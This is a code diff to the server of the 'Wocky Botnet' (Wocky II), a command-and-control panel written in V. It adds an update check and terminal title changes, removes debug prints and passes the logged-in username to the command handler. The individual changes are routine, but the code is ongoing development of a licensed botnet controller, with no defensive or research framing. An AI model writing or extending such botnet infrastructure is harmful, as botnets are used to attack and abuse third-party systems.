@@ -28,6 +28,7 @@ fn main() {
 	wocky_cp.conn_check() or {
 		panic("[x] Error, You have no internet on this box to host Wocky Botnet!\r\n")
 	}
+	wocky_cp.check_update()
 	wocky_cp.licence_valiation()
 	go listener(port)
 	println('[+] NET Started on Port: $port')
@@ -48,6 +49,7 @@ fn listener(port string) {
 
 fn handle_client(mut socket net.TcpConn) {
 	mut u := utils.CLI{}
+	u.set_title(mut socket, "Wocky II | Login")
 	u.resize_terminal(mut socket, 40, 80)
 	mut reader := io.new_buffered_reader(reader: socket)
 	mut current_ip := socket.peer_addr() or { return } //User's IP
@@ -78,22 +80,22 @@ fn handle_client(mut socket net.TcpConn) {
 	socket.write_string(config.Clear + b.color_banner()) or { panic("[x] Error, Unable to send main banner!\r\n") }
 	mut empty_c := 0
 	// Login Successfully Below
+	u.set_title(mut socket, "Wocky II | User: $username")
 	socket.write_string(config.Hostname) or { panic("[x] Error, Failed to send hostname to socket!\r\n") }
 
 	for {
 		mut data := reader.read_line()
 		data = data.replace("\r\n", "")
 		if data.len == 0 {
-			println("empty")
 			empty_c += 1
 			if empty_c > 10 {
 				println('User disconnected ${socket.peer_addr()}')
 				socket.close() or { lol() }
 				break
 			}
-			println('${empty_c} fell in here')
+			// println('${empty_c} fell in here')
 		}
-		server.cmd_handler(mut socket, data) // Main Command Handler
+		server.cmd_handler(mut socket, data, username) // Main Command Handler
 	}
 	reader.free()
 }
